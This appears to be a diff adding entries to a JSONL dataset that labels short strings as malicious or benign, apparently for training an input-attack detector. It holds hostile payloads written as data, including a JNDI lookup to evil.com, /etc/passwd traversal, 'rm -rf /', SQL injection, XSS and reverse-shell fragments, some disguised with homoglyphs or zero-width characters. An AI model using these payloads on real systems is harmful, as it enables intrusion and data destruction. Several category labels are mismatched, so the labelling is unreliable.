+{"text": "​隐藏​字符​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "uname  -a", "label": 0, "category": "benign_shell"}
+{"text": "${jndi:ldap://evil.com/a}​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../etc/passwd​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "perl -e 'chmod 777'", "label": 1, "category": "permission_escalation"}
+{"text": "'; -- ; bypass", "label": 1, "category": "sql_comment_injection"}
+{"text": "UPDATE  users  SET  last_login  =  NOW()  WHERE  id  =  1", "label": 0, "category": "benign_sql"}
+{"text": "<script>alert('xss')</script>​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT  *  FROM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import  os;  os.system('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "for  i  in  range(10):  print(i)", "label": 0, "category": "benign_python"}
+{"text": "--\nshell_exec", "label": 1, "category": "shell_execution"}
+{"text": "<!-- ", "label": 1, "category": "keylogger_installation"}
+{"text": "//  This  function  calls  exec(),  but  with  sanitized  input", "label": 0, "category": "benign_hard"}
+{"text": "wget  --spider  https://example.com", "label": 0, "category": "benign_shell"}
+{"text": "​隐藏​字符​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "powershell -Command \"rm -rf\"", "label": 1, "category": "destructive_file_operation"}
+{"text": "аAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "What  is  the  weather  today?", "label": 0, "category": "benign_text"}
+{"text": "log_entry = 'DROP TABLE users'", "label": 0, "category": "benign_hard"}
+{"text": "wgethttp://", "label": 1, "category": "remote_code_fetch"}
+{"text": "import​ os; os.system('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP TABLE ", "label": 1, "category": "sql_destructive"}
+{"text": "echo 'UNION SELECT'", "label": 1, "category": "sql_injection"}
+{"text": "exec('rm​ -rf ​/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "eval('alert(1)')​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "# pwd", "label": 0, "category": "benign_shell"}
+{"text": "INSERT  INTO  logs  (message,  timestamp)  VALUES  ('info',  NOW())", "label": 0, "category": "benign_sql"}
+{"text": " | echo success", "label": 1, "category": "sql_union_injection"}
+{"text": "*)(uid=*))(|(uid=*​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "ruby -e \"\"", "label": 1, "category": "credential_dumping"}
+{"text": "What  time  is  it?", "label": 0, "category": "benign_text"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": ";\n", "label": 1, "category": "credential_dumping"}
+{"text": "result  =  evaluator.calculate('2+2')", "label": 0, "category": "benign_hard"}
+{"text": "wc  -l  file.txt", "label": 0, "category": "benign_shell"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "​隐藏​字符​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP​ TABLE ​users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<!-- chmod 777", "label": 1, "category": "permission_escalation"}
+{"text": "AaAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "# date", "label": 0, "category": "benign_shell"}
+{"text": "';\n--", "label": 1, "category": "sql_comment_injection"}
+{"text": "node -e \"\"", "label": 1, "category": "sql_time_based"}
+{"text": "SELECT  user_id,  SUM(amount)  FROM  orders  GROUP  BY  user_id", "label": 0, "category": "benign_sql"}
+{"text": "result  =  'test'.replace('t',  'T')", "label": 0, "category": "benign_python"}
+{"text": "<script>alert('xss')</script>‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "How  does  this  function  work?", "label": 0, "category": "benign_text"}
+{"text": ";\n", "label": 1, "category": "sql_union_injection"}
+{"text": "SELECT  category,  COUNT(*)  FROM  products  GROUP  BY  category", "label": 0, "category": "benign_sql"}
+{"text": "echo  $HOME", "label": 0, "category": "benign_shell"}
+{"text": "../../../еtc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "for  item  in  items:  process(item)", "label": 0, "category": "benign_python"}
+{"text": "Can  you  review  my  code?", "label": 0, "category": "benign_text"}
+{"text": "python -c \"UNION SELECT\"", "label": 1, "category": "sql_injection"}
+{"text": "for  i  in  range(10):  print(i)", "label": 0, "category": "benign_python"}
+{"text": "#  TODO:  Remove  debug  line:  system('ls')", "label": 0, "category": "benign_hard"}
+{"text": "../../../etc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "chmod\n777", "label": 1, "category": "permission_escalation"}
+{"text": "UPDATE  products  SET  price  =  99.99  WHERE  id  =  123", "label": 0, "category": "benign_sql"}
+{"text": "log_entry  =  'DROP  TABLE  users'", "label": 0, "category": "benign_hard"}
+{"text": "rm -rf ..", "label": 1, "category": "destructive_file_operation"}
+{"text": "//\nwget http://", "label": 1, "category": "remote_code_fetch"}
+{"text": "powershell -Command \"TRUNCATE\"", "label": 1, "category": "sql_truncation"}
+{"text": "${jndi:ldap://evil.com/a}​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rM -rf /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP​ TABLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../etc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "text = 'Hello World'.upper()", "label": 0, "category": "benign_python"}
+{"text": "wget http:// ", "label": 1, "category": "remote_code_fetch"}
+{"text": "bash -c 'nc -e'", "label": 1, "category": "reverse_shell"}
+{"text": "<!--\n", "label": 1, "category": "sql_union_injection"}
+{"text": "example_code  =  'bash  -i  >&  /dev/tcp/...'", "label": 0, "category": "benign_hard"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR ​1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "UPDATE  products  SET  price  =  99.99  WHERE  id  =  123", "label": 0, "category": "benign_sql"}
+{"text": "*)(Uid=*))(|(uid=*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "echo  $HOME", "label": 0, "category": "benign_shell"}
+{"text": "​隐藏​字符‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP TABLE users;", "label": 1, "category": "sql_destructive"}
+{"text": "chmod 777 ", "label": 1, "category": "permission_escalation"}
+{"text": "import  json", "label": 0, "category": "benign_python"}
+{"text": "bash -i # bypass", "label": 1, "category": "interactive_shell"}
+{"text": "Please  explain  this  code", "label": 0, "category": "benign_text"}
+{"text": "${jndi:ldаp://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../etc/passwd‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "sh -c \"..\\\"", "label": 1, "category": "path_traversal_windows"}
+{"text": "sh -c \"nc -e\"", "label": 1, "category": "reverse_shell"}
+{"text": "rm -rf /root", "label": 1, "category": "destructive_file_operation"}
+{"text": "import  sys", "label": 0, "category": "benign_python"}
+{"text": "; ", "label": 1, "category": "sql_time_based"}
+{"text": "../../../etc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "powershell -Command \"nc -e\"", "label": 1, "category": "reverse_shell"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "What  time  is  it?", "label": 0, "category": "benign_text"}
+{"text": "wget http:// <!-- bypass", "label": 1, "category": "remote_code_fetch"}
+{"text": ";\n../", "label": 1, "category": "path_traversal"}
+{"text": "RM -RF", "label": 1, "category": "destructive_file_operation"}
+{"text": "wget  --spider  https://example.com", "label": 0, "category": "benign_shell"}
+{"text": "'; --", "label": 1, "category": "sql_comment_injection"}
+{"text": "# wc -l file.txt", "label": 0, "category": "benign_shell"}
+{"text": "SELECT  u.name,  o.total  FROM  users  u  JOIN  orders  o  ON  u.id  =  o.user_id", "label": 0, "category": "benign_sql"}
+{"text": "UPDATE  users  SET  last_login  =  NOW()  WHERE  id  =  1", "label": 0, "category": "benign_sql"}
+{"text": "wc  -l  file.txt", "label": 0, "category": "benign_shell"}
+{"text": "cmd /c '; --", "label": 1, "category": "sql_comment_injection"}
+{"text": "ruby -e \"/etc/passwd\"", "label": 1, "category": "sensitive_file_access"}
+{"text": "DROP​ TABLE ​users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "*)(uid=*))(|(uid=*‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP  TABLе  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "*)(uid=*))(|(uid=*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "'; -- # bypass", "label": 1, "category": "sql_comment_injection"}
+{"text": "free  -m", "label": 0, "category": "benign_shell"}
+{"text": "SELECT  *  FROM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<!--\nexec(", "label": 1, "category": "code_execution"}
+{"text": "UPDATE  users  SET  last_login  =  NOW()  WHERE  id  =  1", "label": 0, "category": "benign_sql"}
+{"text": " | echo success", "label": 1, "category": "privilege_escalation"}
+{"text": "whoami", "label": 0, "category": "benign_shell"}
+{"text": "аAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "# echo 'Hello World'", "label": 0, "category": "benign_shell"}
+{"text": "wc  -l  file.txt", "label": 0, "category": "benign_shell"}
+{"text": "# echo $HOME", "label": 0, "category": "benign_shell"}
+{"text": "ls  -R", "label": 0, "category": "benign_shell"}
+{"text": "/* ", "label": 1, "category": "reverse_shell"}
+{"text": "eVaL('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "/*\nchmod 777", "label": 1, "category": "permission_escalation"}
